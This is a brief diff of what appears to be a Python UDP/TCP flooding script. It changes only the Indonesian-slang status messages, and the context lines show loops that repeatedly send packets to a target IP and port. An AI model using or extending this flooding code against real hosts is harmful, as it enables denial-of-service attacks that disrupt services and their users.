@@ -29,7 +29,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" ZIELXXX NIH MANISZZZ!!!")
+			print(i +" ZIEL X LOPEZ NIH MANISZZZ!!!")
 		except:
 			print("[X] MT KAH MANISSS???")
 
@@ -43,7 +43,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ZIELXXX NIH MANISZZZ!!!")
+			print(i +" ZIEL X LOPEZ NIH MANISZZZ!!!")
 		except:
 			s.close()
 			print("[X] MT KAH MANISSS???")
